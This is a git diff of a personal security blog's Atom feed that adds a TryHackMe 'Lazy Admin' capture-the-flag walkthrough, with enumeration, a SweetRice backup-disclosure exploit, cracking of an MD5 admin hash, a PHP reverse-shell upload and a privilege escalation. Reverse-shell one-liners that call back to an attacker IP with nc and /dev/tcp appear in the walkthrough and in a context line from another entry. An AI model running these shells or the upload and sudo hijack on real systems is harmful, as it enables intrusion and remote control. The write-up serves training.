@@ -1,4 +1,194 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-27T17:21:13+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - RootMe</title><link href="http://localhost:4000/tryhackme-rootme/" rel="alternate" type="text/html" title="TryHackMe - RootMe" /><published>2023-03-27T00:00:00+03:00</published><updated>2023-03-27T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-rootme</id><content type="html" xml:base="http://localhost:4000/tryhackme-rootme/"><![CDATA[<p>A ctf for beginners, can you root me?</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-28T17:39:56+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Lazy Admin</title><link href="http://localhost:4000/tryhackme-lazy-admin/" rel="alternate" type="text/html" title="TryHackMe - Lazy Admin" /><published>2023-03-28T00:00:00+03:00</published><updated>2023-03-28T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-lazy-admin</id><content type="html" xml:base="http://localhost:4000/tryhackme-lazy-admin/"><![CDATA[<p>Easy linux machine to practice your skills</p>
+
+<p><br /></p>
+
+<h2 id="1-lazy-admin">1. Lazy Admin</h2>
+
+<p>Have some fun! There might be multiple ways to get user access.</p>
+
+<p><br /></p>
+
+<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.221.70
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/nmap.png" alt="nmap" /></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p>I see an apache default page on the website.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/apache.png" alt="apache" /></p>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan for the website.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-one.png" alt="gobuster-one" /></p>
+
+<p>We found the  <code class="language-plaintext highlighter-rouge">/content/</code> directory. Let’s go to the directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/content.png" alt="content" /></p>
+
+<p>This website uses <code class="language-plaintext highlighter-rouge">SweetRice</code> and it seems to be closed.</p>
+
+<p>So, I try another gobuster scan on this directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/content/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-content.png" alt="gobuster-content" /></p>
+
+<p>We found a few directories here. Let’s examine all directories.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">/inc/</code></strong></em></p>
+
+    <p>We found a lot of files in this directory.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/inc.png" alt="inc" /></p>
+
+    <p>I found lastest.txt. It seems <code class="language-plaintext highlighter-rouge">SweetRice's</code> running version is <code class="language-plaintext highlighter-rouge">1.5.1.</code> Maybe this version is vulnerable.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/lastest.png" alt="lastest" /></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">/as/</code></strong></em></p>
+
+    <p>We found a login page here.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/as.png" alt="as" /></p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p>I searched SweetRice in <a href="https://www.exploit-db.com/">exploit-db</a>.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/search.png" alt="search" /></p>
+
+<p>I am looking to the first. <a href="https://www.exploit-db.com/exploits/40718">SweetRice 1.5.1 - Backup Disclosure</a></p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/first.png" alt="first" /></p>
+
+<p>According to the vulnerability, there is a msql_backup file under the /inc/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/say.png" alt="say" /></p>
+
+<p>Let’s go and see.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/back.png" alt="back" /></p>
+
+<p>Let’s go to the /mysql_backup/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sql-file.png" alt="sql-file" /></p>
+
+<p>Let’s see what’s inside this file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat mysql_bakup_20191129023059-1.5.1.sql
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sql-inside.png" alt="sql-inside" /></p>
+
+<p>We found two important things here.</p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Admin: manager</code></strong></em></p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: 42f749ade7f9e195bf475f37a44cafcb</code></strong></em></p>
+
+<p>It seems the password is a hash. Let’s identify and crack this hash.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/hash-id.png" alt="hash-id" /></p>
+
+<p>This password is encrypted using <strong><code class="language-plaintext highlighter-rouge">MD5</code></strong>.</p>
+
+<p>Let’s crack. <a href="https://md5decrypt.net/">https://md5decrypt.net/</a></p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/crack-hash.png" alt="crack-hash" /></p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: Password123</code></strong></em></p>
+
+<p>Now we can log in as an admin user. Let’s go to the /as/ directory and log in.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/home.png" alt="home" /></p>
+
+<p>Now we can upload a reverse shell. So, I download pentest monkey’s <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a> and edit the php file. <code class="language-plaintext highlighter-rouge">($ip and $port)</code></p>
+
+<p>Then we go to the Post &gt; Create</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/post-create.png" alt="post-create" /></p>
+
+<p>After, we can add a file below the page. (.php file isn’t working you must change the extension.)</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/below.png" alt="below" /></p>
+
+<p>After the upload, the page looks like this.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/upload.png" alt="upload" /></p>
+
+<p>Now, we set up a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 
+</code></pre></div></div>
+
+<p>Then we go to the <a href="http://10.10.103.31/content/attachment/shell.phtml">http://10.10.103.31/content/attachment/shell.phtml</a></p>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/inside.png" alt="inside" /></p>
+
+<p>Now, let’s get to the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="12-what-is-the-root-flag">1.2 What is the root flag?</h3>
+
+<p>Very surprisingly for www-data, we have sudo privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sudo-l.png" alt="sudo-l" /></p>
+
+<p>The backup script is a Perl script that calls /etc/copy.sh</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/copy.png" alt="copy" /></p>
+
+<p>Now we edit this copy.sh, file to get the root privilege.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; /etc/copy.sh 
+</code></pre></div></div>
+
+<p>Let’s setup a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 5555 
+</code></pre></div></div>
+
+<p>Let’s run the backup.pl file and get the root privilege.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo perl /home/itguy/backup.pl
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/privesc.png" alt="privesc" /></p>
+
+<p>We are inside. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="security, linux" /><summary type="html"><![CDATA[Easy linux machine to practice your skills]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/lazy-admin.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/lazy-admin.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - RootMe</title><link href="http://localhost:4000/tryhackme-rootme/" rel="alternate" type="text/html" title="TryHackMe - RootMe" /><published>2023-03-27T00:00:00+03:00</published><updated>2023-03-27T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-rootme</id><content type="html" xml:base="http://localhost:4000/tryhackme-rootme/"><![CDATA[<p>A ctf for beginners, can you root me?</p>
 
 <p><br /></p>
 
@@ -198,7 +388,7 @@ I looked at the user directories in the home directory, but could not find the u
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="web, linux, security" /><summary type="html"><![CDATA[A ctf for beginners, can you root me?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/rootme.png" /><media:content medium="image" url="http://localhost:4000/assets/img/rootme.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Source</title><link href="http://localhost:4000/tryhackme-source/" rel="alternate" type="text/html" title="TryHackMe - Source" /><published>2023-03-25T00:00:00+03:00</published><updated>2023-03-25T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-source</id><content type="html" xml:base="http://localhost:4000/tryhackme-source/"><![CDATA[<p>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, linux, security" /><summary type="html"><![CDATA[A ctf for beginners, can you root me?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/rootme.png" /><media:content medium="image" url="http://localhost:4000/assets/img/rootme.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Source</title><link href="http://localhost:4000/tryhackme-source/" rel="alternate" type="text/html" title="TryHackMe - Source" /><published>2023-03-25T00:00:00+03:00</published><updated>2023-03-25T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-source</id><content type="html" xml:base="http://localhost:4000/tryhackme-source/"><![CDATA[<p>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.</p>
 
 <p><br /></p>
 
@@ -290,7 +480,7 @@ $ show options
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="easy, ctf, cve" /><summary type="html"><![CDATA[Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/source.png" /><media:content medium="image" url="http://localhost:4000/assets/img/source.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Easy Peasy</title><link href="http://localhost:4000/tryhackme-easy-peasy/" rel="alternate" type="text/html" title="TryHackMe - Easy Peasy" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-easy-peasy</id><content type="html" xml:base="http://localhost:4000/tryhackme-easy-peasy/"><![CDATA[<p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="easy, ctf, cve" /><summary type="html"><![CDATA[Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/source.png" /><media:content medium="image" url="http://localhost:4000/assets/img/source.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Easy Peasy</title><link href="http://localhost:4000/tryhackme-easy-peasy/" rel="alternate" type="text/html" title="TryHackMe - Easy Peasy" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-easy-peasy</id><content type="html" xml:base="http://localhost:4000/tryhackme-easy-peasy/"><![CDATA[<p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
 
 <p>Let’s start.</p>
 
@@ -556,7 +746,7 @@ bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="nmap," /><category term="gobuster," /><category term="cronjob" /><summary type="html"><![CDATA[Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/easy-peasy.png" /><media:content medium="image" url="http://localhost:4000/assets/img/easy-peasy.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Magician</title><link href="http://localhost:4000/tryhackme-magician/" rel="alternate" type="text/html" title="TryHackMe - Magician" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-magician</id><content type="html" xml:base="http://localhost:4000/tryhackme-magician/"><![CDATA[<p>This magical website lets you convert image file formats. Let’s start.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="nmap," /><category term="gobuster," /><category term="cronjob" /><summary type="html"><![CDATA[Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/easy-peasy.png" /><media:content medium="image" url="http://localhost:4000/assets/img/easy-peasy.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Magician</title><link href="http://localhost:4000/tryhackme-magician/" rel="alternate" type="text/html" title="TryHackMe - Magician" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-magician</id><content type="html" xml:base="http://localhost:4000/tryhackme-magician/"><![CDATA[<p>This magical website lets you convert image file formats. Let’s start.</p>
 
 <p><br /></p>
 
@@ -713,7 +903,7 @@ $ chisel server --reverse --port 5555
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="CVE-2016-3714" /><summary type="html"><![CDATA[This magical website lets you convert image file formats. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/magician.png" /><media:content medium="image" url="http://localhost:4000/assets/img/magician.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Bounty Hacker</title><link href="http://localhost:4000/tryhackme-bounty-hacker/" rel="alternate" type="text/html" title="TryHackMe - Bounty Hacker" /><published>2023-03-23T00:00:00+03:00</published><updated>2023-03-23T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-bounty-hacker</id><content type="html" xml:base="http://localhost:4000/tryhackme-bounty-hacker/"><![CDATA[<p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="CVE-2016-3714" /><summary type="html"><![CDATA[This magical website lets you convert image file formats. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/magician.png" /><media:content medium="image" url="http://localhost:4000/assets/img/magician.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Bounty Hacker</title><link href="http://localhost:4000/tryhackme-bounty-hacker/" rel="alternate" type="text/html" title="TryHackMe - Bounty Hacker" /><published>2023-03-23T00:00:00+03:00</published><updated>2023-03-23T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-bounty-hacker</id><content type="html" xml:base="http://localhost:4000/tryhackme-bounty-hacker/"><![CDATA[<p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.</p>
 
 <p>Let’s start.</p>
 
@@ -842,7 +1032,7 @@ $ get task.txt
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="linux," /><category term="tar," /><category term="privesc" /><summary type="html"><![CDATA[You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - GamingServer</title><link href="http://localhost:4000/tryhackme-gamingserver/" rel="alternate" type="text/html" title="TryHackMe - GamingServer" /><published>2023-03-21T00:00:00+03:00</published><updated>2023-03-21T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gamingserver</id><content type="html" xml:base="http://localhost:4000/tryhackme-gamingserver/"><![CDATA[<p>An Easy Boot2Root box for beginners. Let’s start.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="linux," /><category term="tar," /><category term="privesc" /><summary type="html"><![CDATA[You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - GamingServer</title><link href="http://localhost:4000/tryhackme-gamingserver/" rel="alternate" type="text/html" title="TryHackMe - GamingServer" /><published>2023-03-21T00:00:00+03:00</published><updated>2023-03-21T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gamingserver</id><content type="html" xml:base="http://localhost:4000/tryhackme-gamingserver/"><![CDATA[<p>An Easy Boot2Root box for beginners. Let’s start.</p>
 
 <p><br /></p>
 
@@ -1015,7 +1205,7 @@ $ cat /mnt/root/rot/root.txt
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="lxd," /><category term="ssh2john," /><category term="security" /><summary type="html"><![CDATA[An Easy Boot2Root box for beginners. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gamingserver.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/gamingserver.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Ignite</title><link href="http://localhost:4000/tryhackme-ignite/" rel="alternate" type="text/html" title="TryHackMe - Ignite" /><published>2023-03-20T00:00:00+03:00</published><updated>2023-03-20T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-ignite</id><content type="html" xml:base="http://localhost:4000/tryhackme-ignite/"><![CDATA[<p>A new start-up has a few issues with their web server.. Let’s start.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="lxd," /><category term="ssh2john," /><category term="security" /><summary type="html"><![CDATA[An Easy Boot2Root box for beginners. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gamingserver.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/gamingserver.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Ignite</title><link href="http://localhost:4000/tryhackme-ignite/" rel="alternate" type="text/html" title="TryHackMe - Ignite" /><published>2023-03-20T00:00:00+03:00</published><updated>2023-03-20T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-ignite</id><content type="html" xml:base="http://localhost:4000/tryhackme-ignite/"><![CDATA[<p>A new start-up has a few issues with their web server.. Let’s start.</p>
 
 <p><br /></p>
 
@@ -1147,7 +1337,7 @@ Password: mememe
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="ctf," /><category term="privesc," /><category term="exploit" /><summary type="html"><![CDATA[A new start-up has a few issues with their web server.. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/ignite.png" /><media:content medium="image" url="http://localhost:4000/assets/img/ignite.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Mustacchio</title><link href="http://localhost:4000/tryhackme-mustacchio/" rel="alternate" type="text/html" title="TryHackMe - Mustacchio" /><published>2023-03-19T00:00:00+03:00</published><updated>2023-03-19T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-mustacchio</id><content type="html" xml:base="http://localhost:4000/tryhackme-mustacchio/"><![CDATA[<p>Easy boot2root Machine. Let’s start.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf," /><category term="privesc," /><category term="exploit" /><summary type="html"><![CDATA[A new start-up has a few issues with their web server.. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/ignite.png" /><media:content medium="image" url="http://localhost:4000/assets/img/ignite.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Mustacchio</title><link href="http://localhost:4000/tryhackme-mustacchio/" rel="alternate" type="text/html" title="TryHackMe - Mustacchio" /><published>2023-03-19T00:00:00+03:00</published><updated>2023-03-19T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-mustacchio</id><content type="html" xml:base="http://localhost:4000/tryhackme-mustacchio/"><![CDATA[<p>Easy boot2root Machine. Let’s start.</p>
 
 <p><br /></p>
 
@@ -1370,7 +1560,7 @@ But now we can get to root.txt.</p>
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="xxe," /><category term="privesc," /><category term="enumeraton" /><summary type="html"><![CDATA[Easy boot2root Machine. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/mustacchio.png" /><media:content medium="image" url="http://localhost:4000/assets/img/mustacchio.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Relevant</title><link href="http://localhost:4000/tryhackme-relevant/" rel="alternate" type="text/html" title="TryHackMe - Relevant" /><published>2023-03-18T00:00:00+03:00</published><updated>2023-03-18T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-relevant</id><content type="html" xml:base="http://localhost:4000/tryhackme-relevant/"><![CDATA[<p>Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="xxe," /><category term="privesc," /><category term="enumeraton" /><summary type="html"><![CDATA[Easy boot2root Machine. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/mustacchio.png" /><media:content medium="image" url="http://localhost:4000/assets/img/mustacchio.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Relevant</title><link href="http://localhost:4000/tryhackme-relevant/" rel="alternate" type="text/html" title="TryHackMe - Relevant" /><published>2023-03-18T00:00:00+03:00</published><updated>2023-03-18T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-relevant</id><content type="html" xml:base="http://localhost:4000/tryhackme-relevant/"><![CDATA[<p>Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.</p>
 
 <p><br /></p>
 
@@ -1543,226 +1733,4 @@ $ cat root.txt
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="pentest," /><category term="security," /><category term="accessible" /><summary type="html"><![CDATA[Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/relevant.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/relevant.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Daily Bugle</title><link href="http://localhost:4000/tryhackme-daily-bugle/" rel="alternate" type="text/html" title="TryHackMe - Daily Bugle" /><published>2023-03-17T00:00:00+03:00</published><updated>2023-03-17T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-daily-bugle</id><content type="html" xml:base="http://localhost:4000/tryhackme-daily-bugle/"><![CDATA[<p>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.</p>
-
-<p><br /></p>
-
-<h2 id="1-deploy">1. Deploy</h2>
-
-<p>Deploy the machine - it may take up to 2 minutes to configure.</p>
-
-<p><br /></p>
-
-<h3 id="11-access-the-web-server-who-robbed-the-bank">1.1 Access the web server, who robbed the bank?</h3>
-
-<p>As usual, let’s do a nmap scan first.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.139.115
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/nmap.png" alt="nmap" /></p>
-
-<p>We found three open port. Theese are 22/tcp SSH, 80/tcp HTTP and 3306/tcp MYSQL.</p>
-
-<p>Let’s visit the homepage. Let’s see what we can find.</p>
-
-<p>We found the robber. It’s a spiderman.</p>
-
-<p><img src="/assets/img/tryhackme/daily-bugle/home.png" alt="home" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">spiderman</code></strong></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h2 id="2-obtain-user-and-root">2. Obtain User and Root</h2>
-
-<p>Hack into the machine and obtain the root user’s credentials.</p>
-
-<p><br /></p>
-
